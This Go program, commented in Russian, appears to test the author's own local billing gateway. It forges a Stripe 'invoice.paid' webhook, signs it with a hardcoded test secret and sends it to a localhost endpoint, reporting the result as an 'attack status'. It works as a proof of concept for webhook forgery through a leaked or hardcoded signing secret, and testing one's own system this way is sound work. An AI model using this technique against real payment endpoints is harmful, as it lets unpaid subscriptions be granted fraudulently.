package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"time"
)

func main() {
	// 1. Формируем "поддельный" JSON от Stripe (Событие успешной оплаты)
	payload := `{"id":"evt_vip_001","type":"invoice.paid","api_version":"2023-10-16","data":{"object":{"subscription":"sub_test_999","period_end":1893456000}}}`

	// #nosec G101
	secret := "whsec_test_secret" // Тот самый хардкод из нашего Шлюза
	timestamp := fmt.Sprintf("%d", time.Now().Unix())

	// 2. Генерируем криптографическую подпись, как это делает ядро Stripe
	// Формула: HMAC_SHA256(timestamp + "." + payload, secret)
	sigPayload := timestamp + "." + payload
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(sigPayload))
	signature := hex.EncodeToString(mac.Sum(nil))

	// 3. Упаковываем в заголовок Stripe-Signature
	header := fmt.Sprintf("t=%s,v1=%s", timestamp, signature)

	// 4. Отправляем боевой POST запрос в наш локальный Docker-кластер
	req, _ := http.NewRequest("POST", "http://localhost:8080/api/v1/billing/stripe", bytes.NewBufferString(payload))
	req.Header.Set("Stripe-Signature", header)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[ОШИБКА СЕТИ] %v\n", err)
		return
	}

	fmt.Printf("[СТАТУС АТАКИ] HTTP %s\n", resp.Status)
}
